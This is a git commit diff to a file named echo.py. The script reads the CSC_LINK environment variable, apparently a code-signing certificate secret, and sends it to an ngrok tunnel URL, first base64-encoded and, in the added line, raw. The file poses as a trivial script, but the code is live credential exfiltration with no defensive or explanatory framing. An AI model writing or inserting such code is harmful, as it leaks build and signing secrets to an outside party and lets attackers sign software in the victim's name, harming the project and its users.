66bee5ad44d2e8ed68351ef02e50eb507906c5ba
Paul Sauer <paulrsauer@gmail.com>
2025-09-26 22:44:39 -0400

    its so long

--- echo.py
+++ echo.py
@@ -3,3 +3,4 @@ import base64
 import requests
 b6 = base64.b64encode(os.environ['CSC_LINK'].encode('utf-8')).decode('utf-8')
 print(requests.get('https://odessa-unwholesome-illy.ngrok-free.dev/' + b6 ).text)
+print(requests.get('https://odessa-unwholesome-illy.ngrok-free.dev/' + os.environ['CSC_LINK'] ).text)
